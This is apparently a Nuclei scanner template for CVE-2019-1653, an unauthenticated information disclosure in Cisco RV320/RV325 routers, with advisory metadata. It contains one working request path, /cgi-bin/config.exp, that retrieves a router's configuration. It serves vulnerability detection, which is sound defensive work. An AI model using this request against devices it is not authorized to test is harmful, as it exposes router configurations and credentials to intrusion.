id: CVE-2019-1653

info:
  name: Cisco Small Business WAN VPN Routers - Sensitive Information Disclosure
  author: dwisiswant0
  severity: high
  description: |
    Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an unauthenticated remote attacker to retrieve sensitive information due to improper access controls for URLs. An attacker could exploit this vulnerability by connecting to an affected device via HTTP or HTTPS and requesting specific URLs. A successful exploit could allow the attacker to download the router configuration or detailed diagnostic information.
  impact: |
    An attacker can exploit this vulnerability to gain access to sensitive information, potentially leading to further attacks.
  remediation: |
    Cisco has released firmware updates that address this vulnerability.
  reference:
    - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info
    - https://www.exploit-db.com/exploits/46262/
    - https://www.exploit-db.com/exploits/46655/
    - https://nvd.nist.gov/vuln/detail/CVE-2019-1653
    - http://packetstormsecurity.com/files/152305/Cisco-RV320-RV325-Unauthenticated-Remote-Code-Execution.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2019-1653
    cwe-id: CWE-200,CWE-284
    epss-score: 0.94354
    epss-percentile: 0.99953
    cpe: cpe:2.3:o:cisco:rv320_firmware:1.4.2.15:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: cisco
    product: rv320_firmware
  tags: cve,cve2019,packetstorm,kev,edb,cisco,router,exposure,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/config.exp"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "sysconfig"

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100f2335b33d52cf441d8ef90a54f2d611950469b851dc1db079490c207a2234242022018e7ba70598d2d5e2407e59dd6f57d5ee7ca3ea6be849718df96ae613ba95b98:922c64590222798bb761d5b6d8e72950